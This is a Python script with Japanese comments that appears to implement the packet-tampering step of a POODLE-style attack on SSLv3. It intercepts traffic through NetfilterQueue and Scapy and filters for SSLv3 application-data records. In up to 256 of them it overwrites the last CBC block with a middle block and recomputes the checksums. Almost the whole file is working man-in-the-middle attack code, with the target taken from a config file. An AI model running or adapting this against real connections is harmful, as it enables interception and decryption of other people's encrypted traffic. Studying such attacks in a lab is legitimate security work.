from netfilterqueue import NetfilterQueue
import sys
from scapy.all import *
from scapy.layers.tls.all import TLS
from scapy.layers.http import *
from scapy.layers.tls import *
from scapy.all import IP, TCP
from scapy.layers.inet import IP, TCP

config = json.load(open('../config.json'))


def get_field(layer, field_name):
    return layer.get_field(field_name).i2repr(layer, getattr(layer, field_name))


def is_sslv3_packet(pkt):
    # TCPがなければ判定できない
    if TCP not in pkt:
        return False

    payload = bytes(pkt[TCP].payload)

    # ペイロードが短すぎる場合は無効
    if len(payload) < 3:
        return False

    SSLV3_VERSION = b'\x03\x00'

    content_type = payload[0]
    version = payload[1:3]

    if content_type not in [20, 21, 22, 23]:  # ハンドシェイクなどのタイプ
        return False

    if version != SSLV3_VERSION:
        return False

    return True


packet_count = 0
previous_packet_tls_payload = None
last_byte_of_the_penultimate_block = 0x00


def attack_callback(packet):
    global packet_count
    global previous_packet_tls_payload
    global last_byte_of_the_penultimate_block

    pkt = IP(packet.get_payload())

    if not TLS in pkt:
        packet.accept()
        return

    if not is_sslv3_packet(pkt):
        packet.accept()
        return

    if pkt.src == config['target']:
        packet.accept()
        return

    packet_type = get_field(pkt.getlayer(TLS), 'type')

    if packet_type == "application_data":
        if packet_count == 0:
            print("first packet")
            previous_packet_tls_payload = bytes(pkt.getlayer('TLS'))[5:]
            packet_count += 1
            packet.accept()
            return
        elif packet_count < 256:
            packet_count += 1
            print("modify")
            current_packet_tls_header = bytes(pkt.getlayer('TLS'))[:5]
            current_packet_tls_payload = bytes(pkt.getlayer('TLS'))[5:]

            # ブロックサイズ（例: 8バイト固定）
            block_size = 8

            # ペイロードの長さを計算
            payload_length = len(current_packet_tls_payload)

            # 最後の一つ前のブロックの最後のバイトを取得
            if payload_length > block_size:
                # 最後のブロックの位置を計算
                last_block_start = (payload_length // block_size) * block_size
                last_block = current_packet_tls_payload[last_block_start:last_block_start + block_size]
                
                # 最後のブロックの一つ前のブロックの最後のバイトを取得
                penultimate_block_start = (payload_length // block_size - 1) * block_size
                penultimate_block = current_packet_tls_payload[penultimate_block_start:penultimate_block_start + block_size]
                last_byte_of_the_penultimate_block = penultimate_block[-1]

            # 真ん中のブロックを切り出し
            middle_index = payload_length // 2
            start_index = (middle_index // block_size) * block_size  # ブロックの開始位置を調整
            current_packet_tls_payload_middle_block = current_packet_tls_payload[start_index:start_index + block_size]

            # 最後のブロックを真ん中のブロックに置き換え
            current_packet_tls_payload_modified = (
                current_packet_tls_payload[:-block_size] +
                current_packet_tls_payload_middle_block
            )

            # 新しいペイロードを作成
            new_payload = current_packet_tls_header + current_packet_tls_payload_modified

            pkt[TCP].remove_payload()
            pkt[TCP].add_payload(new_payload)
            del pkt[TCP].chksum
            del pkt[IP].chksum

            packet.set_payload(bytes(pkt))
            packet.accept()
            return
        else:
            packet.accept()
            nfqueue.unbind()
            sys.exit(0)

    packet.accept()

try:
    nfqueue = NetfilterQueue()
    nfqueue.bind(0, attack_callback)
#    server.serve_forever()
    nfqueue.run()
except KeyboardInterrupt:
    pass

nfqueue.unbind()
# server.server_close()
